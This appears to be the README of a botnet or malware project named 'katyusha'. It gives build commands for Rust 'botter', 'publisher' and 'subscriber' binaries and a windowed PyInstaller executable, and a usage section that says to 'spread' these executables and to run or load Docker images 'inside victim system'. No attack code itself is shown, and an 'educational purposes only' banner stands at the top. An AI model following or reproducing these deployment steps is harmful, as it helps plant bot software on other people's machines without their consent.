# :information_source: EDUCATIONAL PURPOSES ONLY

### Rust Development Setup

```sudo apt install libssl-dev && sudo apt install build-essential && sudo apt install cmake && sudo apt install libpq-dev && cargo install systemfd cargo-watch```

* **Watch _streamer_ publisher microservice:** ```cargo watch -x 'run --bin publisher'```

* **Watch _streamer_ subscriber microservice:** ```cargo watch -x 'run --bin subscriber'```

* **Watch _botter_ microservice:** ```cargo watch -x 'run --bin botter'```

### Docker Setup

```cd katpy && docker build -t katpy . && docker run -d katpy```

### Build on Python

```pyinstaller --onefile --windowed --icon=katyusha.ico katpy/katyusha.py```

### Build on Rust

```cargo build --bin botter --release --manifest-path katrust/Cargo.toml ```

```cargo build --bin publisher --release --manifest-path katrust/Cargo.toml ```

```cargo build --bin subscriber --release --manifest-path katrust/Cargo.toml ```

### Rust Usage

Spread ```botter.exe``` inside `katrust/target/release` folder.

Spread ```subscriber.exe``` inside `katrust/target/release` folder.


### Pythobn Usage

> **First Method**

Spread ```katyusha.exe``` inside `katpy/dist` folder.

> **Second Method**

Run docker images inside victim system either by running the container or by loading the saved images.

> **Third Method**

##### saving the docker images: ```docker save $(docker images -q) | gzip > katyusha.tar.gz```

##### loading saved docker images: ```docker load -i katyusha.tar.gz```
